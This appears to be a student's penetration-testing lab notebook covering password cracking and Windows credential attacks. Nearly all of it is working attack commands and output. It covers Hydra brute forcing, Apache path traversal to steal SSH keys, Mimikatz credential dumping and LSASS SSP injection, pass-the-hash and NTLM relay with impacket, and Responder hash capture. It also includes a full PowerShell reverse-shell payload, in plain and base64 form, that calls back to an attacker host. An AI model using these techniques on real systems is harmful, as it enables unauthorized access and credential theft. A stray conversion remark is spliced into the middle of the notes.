## Hydra Use/Syntax

### Hydra password cracking

**Syntax:**
```bash
hydra -l <username> -P <Wordlist> -s <port> ssh://<ip>   # using ssh with a known user but unknown password
hydra -L <namelist> -p <password> rdp://<ip>             # using rdp with known password but unknown users
hydra -l <username> -P <wordlist> rdp://<ip>             # the inverse of above
```

**Reference:** https://os.cybbh.io/public/os/latest/index.html

## HTTP POST Exploitation

### Process:
1. Look up Tiny File Manager
2. Find that it has 2 default users:
   - Admin
   - User

### Using BurpSuite:
1. Open BurpSuite
2. Go to Proxy and start intercept
3. Open up browser and attempt to login with any creds
4. This will allow us to capture the POST request for the site
5. Copy the login attempt for use with Hydra:
   ```
   fm_usr=user&fm_pwd=Test
   ```

### Capture failed login identifier:
In this case it is:
```
Login failed. Invalid username or password
```

### Format hydra command:
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.58.201 http-post-form "/index.php:fm_user=user&fm_pwd=^PASS^:Login failed. Invalid"
```

**"http-post-form"** is an argument that accepts three colon-delimited fields:
- **First Field:** index.php [location of the login form]
- **Second Field:** The login request body identified with BurpSuite
- **Third Field:** The failed login identifier ["Login failed" string, shortened to reduce false positives {username and password generally cause this}

### GET Request Example:
For GET requests, modify the command as shown below:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.58.201 http-get
```
Much simpler, in this case it returned the correct credentials.

## Creating Demo Rule Files to Edit Rockyou.txt in Execution

In the example given, I am asked to add "1@3$5" to the end of every password.

The command to create the rule is shown below:
```bash
echo "\$1 \$@ \$3 \$$ \$5" > demo.rule
cat demo.rule  # to verify
```

From there you plug this into hashcat:
```bash
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force
```

## Password Manager

In the example shown, a system has KeePass installed, which is a password manager.

### Finding KeePass Database Files:
Database files are stored as ".kdbx" files, to find this file on Windows use:
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

### Converting for Cracking:
From there we can use keepass2john which will format the hashes for us:
```bash
keepass2john Database.kdbx > keepass.hash
cat keepass.hash  # if when viewing the contents you see "Database" prepended, remove it with a text-editor
```

### Finding Hash Mode:
Now to crack it we can use this command to find the -m code:
```bash
hashcat --help | grep -i "KeePass"
```

### Cracking the Hash:
In this example, we will use the rockyou-30k rule, a ruleset which contains 30k rules for passwords:
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

## Lab:

### RDP into system with given creds:
```bash
xfreerdp /u:jason /p:lab /v:192.168.58.203
```

1. Verify existence of keepass
2. Run command to locate KeePass database:
   ```powershell
   Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
   ```
3. Once found, transfer to attack box to crack hash:
   ```bash
   scp C:\Users\jason\Documents\Database.kdbx kali@192.168.49.58:/home/kali
   ```
4. Now use keepass2john to format the file for use:
   ```bash
   keepass2john Database.kdbx > keepass.hash
   cat keepass.hash
   vim keepass.hash  # removed leading database
   ```
5. From here use hashcat to crack the hash:
   ```bash
   hashcat --help | grep -i "KeePass"
   hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
   ```

**Result:** `qwertyuiop123!`

Return to RDP session and input password for access.

## Lab 2:

1. Started by enumerating VM #2:
   ```bash
   nmap -p- -T5 -v 192.168.58.227 -sV
   ```
   Most notable ports were 3389 (RDP) and 445 (SMB)

2. From here I will use Hydra with the supplied username to try and find an RDP password:
   ```bash
   hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.58.227
   ```

**Result:**
- Login: nadine
- Password: 123abc

3. Now I will RDP into the system:
   ```bash
   xfreerdp /u:nadine /p:123abc /v:192.168.58.227
   ```

4. Again, verify existence of KeePass, then run command to find database:
   ```powershell
   Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
   ```

It is also located in nadines Documents directory, I will scp it over.
From here, all steps are a replication of the prior lab.

## SSH Private Key Passphrase

Once someone else's id_rsa file is acquired, permissions NEED to be changed to 600:
```bash
chmod 600 id_rsa
```

From there, you can attempt ssh logons, or immediately move to format the hash in the id_rsa file with ssh2john:
```bash
ssh2john id_rsa > ssh.hash
cat ssh.hash
vim ssh.hash  # again removing the file name prepended
```

### Creating Custom Rules:
In the demo, we see that in a text file we found a password list and note to self about how the pwd policy is updating.

We will create a rule for the ssh based on this new policy of 3 Numbers, a Capital letter, and a special character.
The most common format for passwords is capital letter first, numbers second to last, and special character last:

```bash
echo "c \$1 \$3 \$7 \$!\nc \$1 \$3 \$7 \$@\nc \$1 \$3 \$7 \$#" > ssh.rule  # most common special characters
```

### Using John the Ripper:
Hashcat is weird about SSH these days so we will instead use JohntheRipper.

To use the rule file, we need to prepend a name:
```bash
vim ssh.rules
```
Add:
```
[List.Rules:sshRules]
```

Then we need to add these rules to JtR's configuration file:
```bash
sudo sh -c 'cat /home/kali/ssh.rule >> /etc/john/john.conf'
```

From here we can use JtR with the rules and passwords to crack the hash:
```bash
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

### SSH with someone else's id_rsa file:
```bash
ssh -i id_rsa [all the rest of normal info goes after]
```

## Lab 2:

For this we had to enumerate 192.168.52.201 to find a way to access port 2223.

The version of apache running, 2.4.49, is vulnerable to directory traversal:
```bash
curl --path-as-is http://192.168.52.201/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
[This verifies existence of alfred]

```bash
curl --path-as-is http://192.168.52.201/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/alfred/.ssh/id_rsa
```
[Allows us to take his RSA key]

From here, with his id_rsa file, we can crack it with ssh2john and log in for the flag.

## NTLM Password Cracking

We'll retrieve passwords from the SAM of the MARKETINGWK01 machine at 192.168.50.210. We can log in to the system via RDP as user offsec, using lab as the password.

```powershell
Get-LocalUser
```

We'll use Mimikatz (located at C:\tools\mimikatz.exe) to check for stored system credentials.

```cmd
cd C:\tools
ls
.\mimikatz.exe
```

### Mimikatz Commands:
- `sekurlsa::logonpasswords` - attempts to extract plaintext passwords and password hashes from all available sources
- `lsadump::sam` - extracts the NTLM hashes from the SAM
- `token::elevate` - elevate to SYSTEM user privileges
- `privilege::debug` - must be enabled to use sekurlsa and lsadump

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM
656     {0;000003e7} 1 D 34811          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
-> Impersonated !
* Process Token : {0;000413a0} 1 F 6146616     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
* Thread Token  : {0;000003e7} 1 D 6217216     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000

RID  : 000003e9 (1001)
User : offsec
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e

RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
...
```

### Cracking NTLM Hashes:
Grab the hash and copy it into a file then use NTLM to crack it:
```bash
hashcat --help | grep -i "ntlm"
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Cracking NTLM Lab #2

Access VM #2 via RDP as user nadine with the password retrieved in the exercise of the section labeled "Password Manager" and leverage the methods from this section to extract Steve's NTLM hash. Use best64.rule for the cracking process and enter the plain text password as answer to this exercise.

1. First, verified KeePass is present on the system
2. Extracted KeePass database file
3. Opened terminal in users Document folder and SCP'd the file to kali box:
   ```bash
   scp .\Database.kdbx kali@192.168.49.52:/home/kali
   ```
4. Converted file to crack:
   ```bash
   keepass2john Database.kdbx > keepass.hash
   vim keepass.hash
   hashcat --help | grep -i "KeePass"
   hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
   ```

**Result:** `pinkpanther1234`

5. Start Powershell as Administrator:
   ```cmd
   cd C:\tools
   .\mimikatz.exe
   privilege::debug
   token::elevate
   lsadump::sam
   ```

6. Extract Hash and Crack it with Hashcat:
   ```bash
   echo "2835573fb334e3696ef62a00e5cf7571" > steve.hash
   hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
   ```

**Result:** `francesca77`

## Passing NTLM

In some instances hashes are too complex to be cracked reasonably so you have to use pass-the-hash (PtH) instead.

Can use hash to authenticate with SMB, RDP, and WinRM (also mimikatz).

### Examples:

**SMB:**
```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
dir
get secrets.txt
```

**Psexec:**
```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
hostname
ipconfig
whoami
exit
```

**WMIexec:**
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

### Lab:
```bash
echo "e78ca771aeb91ea70a6f1bb372c186b6" > files02admin.hash
echo "7a38310ea6f0027ee955abed1762964b" > admin.hash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
hostname  # files02
whoami    # Administrator
cd C:\Users\Administrator\Desktop
dir
type flag.txt
```

## Cracking Net-NTLMv2

Net-NTLMv2 exists in nearly all environments. To exploit we need to catch an authentication attempt to a system we control.

Responder is good for this, it hosts a built-in SMB server and prints captured hashes.
Also includes Link-Local Multicast Name Resolution (LLMNR), NetBios Name Service (NBT-NS) and Multicast_DNS (MDNS).

### Process:
```bash
nc 192.168.50.211 4444
whoami
net user paul  # checking to see group permissions
```

We'll run responder as sudo to enable permissions needed to handle privileged raw socket operations for the various protocols. We'll set the listening interface with -I:

```bash
ip a
sudo responder -I tap0
```

## Cracking Net-NTLMv2 (continued)

Our next step is to request access to a non-existent SMB share on our Responder SMB server using paul's bind shell. We'll do this with a simple dir listing of `\\192.168.119.2\test`, in which "test" is an arbitrary directory name. We are only interested in the authentication process, not a share listing.

```bash
dir \\192.168.119.2\test
```

**Responder Output:**
```
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000
```

```bash
cat paul.hash
hashcat --help | grep -i "ntlm"
```

Output shows:
```
 5500 | NetNTLMv1 / NetNTLMv1+ESS                           | Network Protocol
27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                      | Network Protocol
 5600 | NetNTLMv2                                           | Network Protocol
27100 | NetNTLMv2 (NT)                                      | Network Protocol
 1000 | NTLM                                                | Operating System
```

### Cracking the Hash:
```bash
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

**Result:** `123Password123`

## Lab 2:

For this one you are only given the IP to a server with a web application.
There are no login fields so you cant do that.
The only identifiable option was a file upload button.
When using it, it just seemed to take anything.

Going on BurpSuite and intercepting the file upload allowed this:

```http
POST /upload HTTP/1.1
Host: marketingwk01:8000
Content-Length: 190
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://marketingwk01:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryU5QYwaQumr2wgIL9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://marketingwk01:8000/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryU5QYwaQumr2wgIL9
Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.49.52\\file.txt"
Content-Type: application/octet-stream

------WebKitFormBoundaryU5QYwaQumr2wgIL9--
```

Emphasis on the filename portion, whereby I had responder running and forced an authentication request, gaining me the systems hashes.

**Result:**
```
[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:57531e41722bcb1c:5F4D39F45B495A71A136FBF9283E0C3D:0101000000000000802AC9155930DC013D6AFC2D8F57666800000000020008004F004A005100420001001E00570049004E002D003100320048004400440049004C00490053004900590004003400570049004E002D003100320048004400440049004C0049005300490059002E004F004A00510042002E004C004F00430041004C00030014004F004A00510042002E004C004F00430041004C00050014004F004A00510042002E004C004F00430041004C0007000800802AC9155930DC010600040002000000080030003000000000000000000000000020000014FF970AEB8E8416F1E5D5B21CFFB7AEE516480F1CC791C83444E1D0E07BF22E0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00340039002E00350032000000000000000000
```

## Relaying Net-NTLMv2

For this, we will have to try and gain access as an unprivileged user meaning no mimikatz.

Instead of merely printing the Net-NTLMv2 hash used in the authentication step, we'll forward it to FILES02. If files02admin is a local user on FILES02, the authentication is valid and therefore accepted by the machine. If the relayed authentication is from a user with local administrator privileges, we can use it to authenticate and then execute commands over SMB.

We'll perform this attack with ntlmrelayx, another tool from the impacket library.

### Options:
- `--no-http-server` to disable the HTTP server since we are relaying an SMB connection
- `-smb2support` to add support for SMB2
- `-t` to set the target
- `-c` to set our command

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```

Next, we'll start a Netcat listener on port 8080 (in a new terminal tab) to catch the incoming reverse shell:
```bash
nc -nvlp 8080
```

Now we'll run Netcat in another terminal to connect to the bind shell on FILES01 (port 5555). After we connect, we'll enter `dir \\192.168.119.2\test` to create an SMB connection to our Kali machine:
```bash
nc 192.168.50.211 5555
whoami
dir \\192.168.119.2\test
```

### Encoded Command Syntax:
```powershell
pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.49.65",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```

**Result:**
```
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADUAMgAiACwAOAAwADgAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

```bash
exit
```

## Relaying Net-NTLMv2 Lab 2:

**Goal:** Start VM Group 2 and find a way to obtain a Net-NTLMv2 hash from the anastasia user via the web application on VM #3 (BRUTE2) and relay it to VM #4 (FILES02).

- VM #3 - 192.168.65.202
- VM #4 - 192.168.65.212

### Process:

1. Starting with an NMAP scan on VM #3, notable ports for the web application are 8000, 3389, and 47001

2. Performing a service scan on those selected ports (barring 3389 which is just RDP) reveals:
   - 8000 - Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
   - 47001 - Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

3. Running the HTTP-ENUM script revealed:
   - /css/: Potentially Interesting Folder
   - /img/: Potentially Interesting Folder
   - /js/: Potentially Interesting Folder

4. Visiting the home page shows a terminal where powershell commands can be input, by running "ls" as a test, it displays the output of a directory showing command injection is possible

5. Through burp suite I intercept the request that's sent whenever you input powershell commands

6. Next I start the impacket-ntlmrelayx server:
   ```bash
   impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.65.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADYANQAiACwAOAAwADgAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
   ```

## Relaying Net-NTLMv2 Lab 2 (continued):

7. Following that, I start a nc listener on the designated port in the encoded command (8080 in this case):
   ```bash
   nc -nvlp 8080
   ```

8. Then, in BurpSuite, I run the command `dir \\192.168.49.65\test` (my kali ip) and the SMB connection is caught and forwarded to the 192.168.65.212 server (target set with impacket) granting me system access

> **Note:** Why doesn't the command need 4 backslashes since I'm running it through a browser input????

---

This markdown conversion preserves all the original content while making it more readable and organized with proper headings, code blocks, and formatting. The technical commands and procedures are clearly delineated, making it easier to follow the various penetration testing techniques described in the document.

## Windows Credential Guard

Up to this point we have dealt with hashes that belonged to local accounts. However, we may encounter other types of accounts, including Windows domain accounts.

Let's start by using Mimikatz (located at C:\tools\mimikatz\mimikatz.exe) to obtain hashes for a domain user. In order to obtain hashes from a domain user, we'll need to log in to a system using domain credentials. Let's RDP into CLIENTWK246 as the CORP\Administrator user with the QWERTY!@# password.
   ```bash
   xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.246 /dynamic-resolution
   ```

With the terminal open, let's navigate to C:\tools\mimikatz\ folder and run mimikatz.exe.
   ```pwsh
   PS C:\Users\offsec> cd C:\tools\mimikatz\
   PS C:\tools\mimikatz> .\mimikatz.exe
   
     .#####.   mimikatz 2.2.0 (x64) #19041 Oct 20 2023 07:20:39
    .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
    ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
    ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
    '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
     '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
   
   mimikatz # privilege::debug
   Privilege '20' OK
   
   mimikatz # sekurlsa::logonpasswords
   
   Authentication Id : 0 ; 5795018 (00000000:00586cca)
   Session           : RemoteInteractive from 6
   User Name         : offsec
   Domain            : CLIENTWK246
   Logon Server      : CLIENTWK246
   Logon Time        : 9/19/2024 2:08:43 AM
   SID               : S-1-5-21-180219712-1214652076-1814130762-1002
           msv :
            [00000003] Primary
            * Username : offsec
            * Domain   : CLIENTWK246
            * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
            * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
            * DPAPI    : a188967ac5edb88eca3301f93f756ca8
           tspkg :
           wdigest :       KO
           kerberos :
            * Username : offsec
            * Domain   : CLIENTWK246
            * Password : (null)
           ssp :
           credman :
           cloudap :
   ...
   Authentication Id : 0 ; 5468350 (00000000:005370be)
   Session           : RemoteInteractive from 5
   User Name         : Administrator
   Domain            : CORP
   Logon Server      : SERVERWK248
   Logon Time        : 9/19/2024 2:08:28 AM
   SID               : S-1-5-21-1711441587-1152167230-1972296030-500
           msv :
            [00000003] Primary
            * Username : Administrator
            * Domain   : CORP
            * NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
            * SHA1     : 2b26e304f13c21b8feca7dcedb5bd480464f73b4
            * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
           tspkg :
           wdigest :       KO
           kerberos :
            * Username : Administrator
            * Domain   : CORP.COM
            * Password : (null)
           ssp :
           credman :
           cloudap :
   ```

This output shows that we obtained the local offsec user's credential information as expected. However, we also gained access to the Administrator user's information from the CORP.COM domain.

Using this information, we can implement a pass-the-hash attack and gain access to the SERVERWK248 (192.168.50.248) machine.
   ```bash
   kali@kali:~$ impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
   Impacket v0.12.0.dev1 - Copyright 2023 Fortra
   
   [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
   [*] SMBv3.0 dialect used
   [+] Target system is 192.168.50.248 and isFQDN is False
   [+] StringBinding: SERVERWK248[64285]
   [+] StringBinding: 192.168.50.248[64285]
   [+] StringBinding chosen: ncacn_ip_tcp:192.168.50.248[64285]
   [!] Launching semi-interactive shell - Careful what you execute
   [!] Press help for extra shell commands
   C:\>
   ```

## HASH Exploit Mitigations

Virtualization-based Security (VBS) is a software technology which takes advantage of the hardware virtualization features that modern CPUs provide. VBS runs a hypervisor on the physical hardware rather than running on the operating system. Specifically, VBS is implemented through Hyper-V, Microsoft's native hypervisor. In addition, Microsoft built the Virtual Secure Mode (VSM).

VSM creates isolated regions in memory where the operating system can store highly-sensitive information and system security assets. VSM maintains this isolation through what is known as Virtual Trust Levels (VTLs). Each VTL represents a separate isolated memory region and currently Microsoft supports up to 16 levels, ranked from least privileged, VTL0, to VTL1, with VTL1 having more privileges than VTL0 and so on. As of the writing of this module Windows uses two VTLs:

   VTL0 (VSM Normal Mode): Contains the Windows environment that hosts regular user-mode processes as well as a normal kernel (nt) and kernel-mode data.
   VTL1 (VSM Secure Mode): Contains an isolated Windows environment used for critical functionalities.

In this Module, we'll focus on Credential Guard mitigation. When enabled, the Local Security Authority (LSASS) environment runs as a trustlet in VTL1 named LSAISO.exe (LSA Isolated) and communicates with the LSASS.exe process running in VTL0 through an RCP channel.
   ```bash
   xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution
   ```

To start off we want to confirm that Credential Guard is running on our machine. We can do this through the Get-ComputerInfo powershell cmdlet.
   ```pwsh
   PS C:\Users\offsec> Get-ComputerInfo

   WindowsBuildLabEx                                       : 22621.1.amd64fre.ni_release.220506-1250
   WindowsCurrentVersion                                   : 6.3
   WindowsEditionId                                        : Enterprise
   ...
   HyperVisorPresent                                       : True
   HyperVRequirementDataExecutionPreventionAvailable       :
   HyperVRequirementSecondLevelAddressTranslation          :
   HyperVRequirementVirtualizationFirmwareEnabled          :
   HyperVRequirementVMMonitorModeExtensions                :
   DeviceGuardSmartStatus                                  : Off
   DeviceGuardRequiredSecurityProperties                   : {BaseVirtualizationSupport, SecureBoot}
   DeviceGuardAvailableSecurityProperties                  : {BaseVirtualizationSupport, SecureBoot, DMAProtection, SecureMemoryOverwrite...}
   DeviceGuardSecurityServicesConfigured                   : {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3}
   DeviceGuardSecurityServicesRunning                      : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
   DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode
   DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : AuditMode
   ```

> As we can see from the above output, one of the mitigations enabled under DeviceGuardSecurityServicesRunning is CredentialGuard.

Running mimikatz on the system with credential guard shows only the local users of the system, because the LSASS process only has access to this information after it has been encrypted by the LSAISO process.

Microsoft provides quite a few authentication mechanisms as part of the Windows operating system such as Local Security Authority (LSA) Authentication, Winlogon, Security Support Provider Interfaces (SSPI), etc. Specifically, SSPI is foundational as it is used by all applications and services that require authentication. For example, when two Windows computers or devices need to be authenticated in order to securely communicate, the requests made for authentication are routed to the SSPI which then handles the actual authentication.

By default, Windows provides several Security Support Providers (SSP) such as Kerberos Security Support Provider, NTLM Security Support Provider, etc. these are incorporated into the SSPI as DLLs and when authentication happens the SSPI decides which one to use.

What is important to know is that we can register multiple SSPs through the AddSecurityPackage API.

Additionally the SSP can also be registered through the HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages registry key. Each time the system starts up, the Local Security Authority (lsass.exe) loads the SSP DLLs present in the list pointed to by the registry key.

What this means is that if we were to develop our own SSP and register it with LSASS, we could maybe force the SSPI to use our malicious Security Support Provider DLL for authentication.

Fortunately, Mimikatz already supports this through the memssp, which not only provides the required Security Support Provider (SSP) functionality but injects it directly into the memory of the lsass.exe process without dropping any DLLs on disk.

```bash
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # misc::memssp
Injected =)
```

At this point, we have two options, we can either be patient and wait for another user to remotely connect to the machine or we can resort to additional techniques such as social engineering to coerce someone to log in.

When injecting a SSP into LSASS using Mimikatz, the credentials will be saved in a log file, C:\Windows\System32\mimilsa.log.
   ```pwsh
   PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
